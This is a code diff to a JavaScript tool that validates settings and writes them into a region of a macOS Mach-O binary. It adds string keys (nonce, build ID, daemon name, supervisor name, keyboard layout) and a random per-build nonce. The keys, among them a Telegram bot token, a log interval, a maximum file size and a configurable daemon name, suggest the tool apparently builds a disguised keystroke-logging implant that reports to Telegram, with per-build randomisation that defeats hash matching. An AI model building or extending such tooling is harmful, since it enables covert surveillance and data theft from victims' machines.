@@ -30,9 +30,18 @@ export const SENSITIVE_KEYS = new Set([
   "TELEGRAM_PROXY",
 ]);
 
+export const STRING_KEYS = new Set([
+  "C2T_NONCE",
+  "C2T_BUILD_ID",
+  "C2T_DAEMON_NAME",
+  "C2T_SUPERVISOR_NAME",
+  "C2T_KEYBOARD_LAYOUT",
+]);
+
 export const ALLOWED_KEYS = new Set([
   ...FLAG_KEYS,
   ...SENSITIVE_KEYS,
+  ...STRING_KEYS,
   "TELEGRAM_LOG_INTERVAL_SEC",
   "TELEGRAM_MAX_FILE_BYTES",
   "C2T_QUEUE_MAX_BYTES",
@@ -44,9 +53,21 @@ export const ALLOWED_KEYS = new Set([
 
 const SIZE_KEYS = new Set(
   [...ALLOWED_KEYS].filter(
-    (key) => !FLAG_KEYS.has(key) && !SENSITIVE_KEYS.has(key),
+    (key) => !FLAG_KEYS.has(key) && !SENSITIVE_KEYS.has(key) && !STRING_KEYS.has(key),
   ),
 );
+
+export function generateRandomNonce(length = 32) {
+  const bytes = new Uint8Array(Math.ceil(length / 2));
+  if (typeof crypto !== "undefined" && typeof crypto.getRandomValues === "function") {
+    crypto.getRandomValues(bytes);
+  } else {
+    for (let i = 0; i < bytes.length; i += 1) {
+      bytes[i] = Math.floor(Math.random() * 256);
+    }
+  }
+  return Array.from(bytes, (b) => b.toString(16).padStart(2, "0")).join("").slice(0, length);
+}
 
 function writeUint32(view, offset, value) {
   view.setUint32(offset, value >>> 0, true);
@@ -78,6 +99,9 @@ export function validateConfig(config) {
     }
     if (SIZE_KEYS.has(key) && !/^[1-9][0-9]*$/.test(value)) {
       throw new Error(`${key} must be a positive decimal integer`);
+    }
+    if (STRING_KEYS.has(key) && !/^[a-zA-Z0-9_.-]{1,64}$/.test(value)) {
+      throw new Error(`${key} must be 1-64 alphanumeric characters (_.- allowed)`);
     }
     const byteLength = new TextEncoder().encode(value).length;
     if (key === "TELEGRAM_BOT_TOKEN" && byteLength >= 512) {
@@ -225,11 +249,15 @@ function rejectSignedMachO(binary) {
   }
 }
 
-export function patchBinary(input, config) {
+export function patchBinary(input, config, options = {}) {
   const binary = input instanceof Uint8Array ? input : new Uint8Array(input);
   rejectSignedMachO(binary);
   const offset = locateRegion(binary);
-  const payload = encodePayload(config);
+  const effectiveConfig = { ...config };
+  if (options.randomize !== false && !effectiveConfig.C2T_NONCE && !effectiveConfig.C2T_BUILD_ID) {
+    effectiveConfig.C2T_NONCE = generateRandomNonce(32);
+  }
+  const payload = encodePayload(effectiveConfig);
   const result = new Uint8Array(binary);
   result.fill(0, offset, offset + REGION_SIZE);
   result.set(MAGIC, offset);
